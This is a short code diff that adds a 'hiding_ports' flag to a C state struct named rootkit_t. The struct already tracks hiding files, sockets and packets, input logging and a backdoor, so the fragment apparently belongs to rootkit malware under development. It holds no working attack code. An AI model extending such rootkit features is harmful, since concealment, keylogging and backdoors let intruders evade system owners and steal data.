@@ -17,6 +17,7 @@ typedef struct {
     bool hiding_open;
     bool hiding_sockets;
     bool hiding_packets;
+    bool hiding_ports;
     bool logging_input;
     bd_state_t backdoor;
 } rootkit_t;
